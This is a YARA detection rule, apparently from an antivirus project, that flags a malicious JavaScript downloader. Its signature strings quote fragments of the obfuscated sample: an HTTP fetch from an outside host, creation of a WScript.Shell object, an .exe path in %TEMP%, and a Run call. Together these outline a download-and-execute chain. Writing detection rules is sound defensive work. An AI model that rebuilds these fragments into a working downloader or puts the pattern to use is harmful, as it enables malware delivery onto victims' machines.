rule sig_20160328_a3de0ca5df11fe0719774e242fb45729 {
  meta:
    description = "datamaliciousorder - file 20160328_a3de0ca5df11fe0719774e242fb45729.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "307b4d95419c58d18e30f95a8e4a4d058a17d446c317d9264a10d64b291097ac"

  strings:
    $s1  = "function Rkejwpnsz() {return Lmghiddqaj[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"o4w67JxZEFSpOHZ.exe\";};" fullword ascii
    $s2  = "Yqiqsnhklm[Qymweh](\"GET\", \"http://bbwsa.com/m7rysa\", false);" fullword ascii
    $s3  = "do {WScript[Eojdofmug](Kupihb() * 11)} while (Yqiqsnhklm[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Lmghiddqaj = function Tvvsyha() {return WScript[Dtpsajkksw](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Elceuc(Dikqdnot, Xzozdlg){return Dikqdnot - Xzozdlg;};" fullword ascii
    $s6  = "function Uteoyy() {return ((Mymbxnemj == true) && (Mymbxnemj == Apghbw)) ? 1 : Lwmpqezs;};" fullword ascii
    $s7  = "function Xannj(Wnpqcy){Lmghiddqaj[\"Run\"](Wnpqcy, Lwmpqezs, Lwmpqezs);};" fullword ascii
    $s8  = "var Ggfmedvhv = false;" fullword ascii
    $s9  = " while (Dxkhhmnel){" fullword ascii
    $s10 = "function Awvgag(){return Dtpsajkksw;};" fullword ascii
    $s11 = "Mymbxnemj = true; " fullword ascii
    $s12 = "function Bgelvleuo(){return Xvzlei;};" fullword ascii
    $s13 = "Apghbw = true; " fullword ascii
    $s14 = "function Omelwlwyss(Wwvrg) {var Jtmhozjnv = (1, 2, 3, 4, 5, Wwvrg); return Jtmhozjnv;};" fullword ascii
    $s15 = "var Mymbxnemj = false;" fullword ascii
    $s16 = "var Apghbw = false;" fullword ascii
    $s17 = "function Zlqarsvu()" fullword ascii
    $s18 = "var Gkovbf = new this[\"Date\"]();" fullword ascii
    $s19 = "return Elceuc(Drklx, Thnqmqb);" fullword ascii
    $s20 = "function Kupihb(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}